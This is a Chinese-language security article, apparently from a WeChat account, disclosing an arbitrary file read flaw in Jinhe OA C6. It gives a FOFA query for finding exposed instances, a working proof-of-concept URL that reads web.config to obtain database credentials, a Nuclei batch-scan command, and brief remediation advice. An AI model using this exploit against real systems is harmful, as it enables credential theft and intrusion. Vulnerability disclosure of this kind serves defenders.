<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7vdZTeLssbWicopZPDhRLQ)

  

点击上方蓝字关注我们

BEGINNING OF SPRING

![](https://mmbiz.qpic.cn/mmbiz_gif/z7icWibwNQicf1QCEcTzvGFkdLPgp832KCow54U64xGcfU3BoUqphwjsUoJic0EyTBMFAxEykWLnfeILAcZRtzLrdQ/640?wx_fmt=gif)

0x01

      阅读须知       

Reading Instructions

![](https://mmbiz.qpic.cn/mmbiz_png/X8pI8icoh79vrwCxdib7QSBb6QLSO3psbEiaXHfy8RZh13ic6m57LBtGhC60SdVIVRk7GmvkqiaibIriaHvgkORAia55lQ/640?wx_fmt=png)

    数字人才创研院秉承探究学习与交流的理念，一切从降低已有潜在威胁出发，所有发布的技术文章仅供参考，未经授权请勿利用文章中的技术内容对任何计算机系统进行入侵操作，否则对他人或单位而造成的直接或间接后果和损失，均由使用者本人负责。

    郑重声明：本文所提供的工具与思路仅用于学习与研究，禁止用于非法目的！

团队已致电客户说明并告知详细解决方案！  

![](https://mmbiz.qpic.cn/mmbiz_png/XQsIhMDyz0unrjh9QZibtE16IibicwafvgPDLKqCMhDFfddJIWIHR8FWuIjyib2OpS1LNz9VWTt0EBTwTHMpSibibvng/640?wx_fmt=png)

0x02

       漏洞概述      

Vulnerability Overview

  

  

  金和 OA 协同办公管理系统 C6 软件共有 20 多个应用模块，160 多个应用子模块，涉及的企业管理业务包括协同办公管理、人力资源管理、项目管理、客户关系管理、企业目标管理、费用管理等多个业务范围，从功能型的协同办公平台上升到管理型协同管理平台，并不断地更新完善，全面支撑企业发展, 提供专业 oa,oa 系统, oa 办公系统, 办公自动化软件, 协同办公管理系统. 支持 oa 办公自动化系统免费在线试用。

  该 OA C6 系统的 download.jsp 文件**存在任意文件读取漏洞**，攻击者通过漏洞可以获取服务器的敏感信息。

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MPrt2xIEpHQBXRAYykMNIce3sibQAWiaKwQjllszoT1bxuIJRib2h1yyCic171RXO1IrHpzjLnDTLNFYKThvA3kIeg/640?wx_fmt=png)

0x03

       漏洞复现      

Vulnerability Recurrence

![](https://mmbiz.qpic.cn/mmbiz_png/bDYS2PAYoqic9mQ5FnGia01eSuHGU1UPycSXqxrvp6ibBX9pQPGfK2AWibOef8ET2TJ8OCoaian4s8C6zgqyavG6ibPQ/640?wx_fmt=png)

fofa：app="金和网络 - 金和 OA"

  

  

  

1. 执行 POC 即可获取 Web.config 文件内容，其中包含数据库账号密码。

```
http://IP/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
其中IP为目标漏洞平台的实际地址或域名

```

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MPrt2xIEpHQBXRAYykMNIce3sibQAWiaKwStYpyVmaogzuaxgvicwHm2l1ZdxwzzEBOQx8nXW6JYVVKiaG8p984tww/640?wx_fmt=png)

  

  

2. 打开 Web.config 文件定位敏感信息处，得到如下信息。

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MPrt2xIEpHQBXRAYykMNIce3sibQAWiaKw9O5ibIBWQzHHrQ9TxKibK052Uqic4YHM9FIaN1xgvPR3oxKQJj3LLGXRA/640?wx_fmt=png)

  

  

3. 获取 User 和 Password 后，借助数据库连接工具即可进一步获取敏感信息，由于涉及大量信息，小编已忽略具体截图。

  

  

0x04

     漏洞脚本     

Vulnerability script

  

  

1.Nuclei 验证脚本命令使用如下：

```
nuclei.exe -t JinheOA_download.yaml -l JinheOA_download_Subs.txt
--------------------------------------------
JinheOA_download_Subs.txt可以结合实际情况自定义
--------------------------------------------

```

  

  

  

  

2.Nuclei 的运行截图如下：

![](https://mmbiz.qpic.cn/mmbiz_png/MPrt2xIEpHSxnh5c4MMNu7svIcMZkwym1YTJ5juFpN1AbicMtYxKJq0OEPcnTgWgmOx701BEUUzYGrFjroXVzqg/640?wx_fmt=png)

  

  

  

  

3. 获取 POC 脚本，可回复公众号：**金和 OA**。

  

  

0x05

     修复建议     

Repair Suggestions

  

  

1.  实施产品的权限访问控制，降低互联网搜索引擎的查询。
    
2.  加强后台认证要求（如 AAAA 策略等），提高口令的安全性。
    
3.  增强关键页面的安全性，提升 WEB 后台的安全访问控制权限能力。
    

  

  

END

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaBAicDNCSs6H0O0SBGSALfn3R3579I4bCLalicIr2ib0xY9ujssMRaUE3hGg4oW0QaiclhD6Vib8WY3Ig/640?wx_fmt=gif)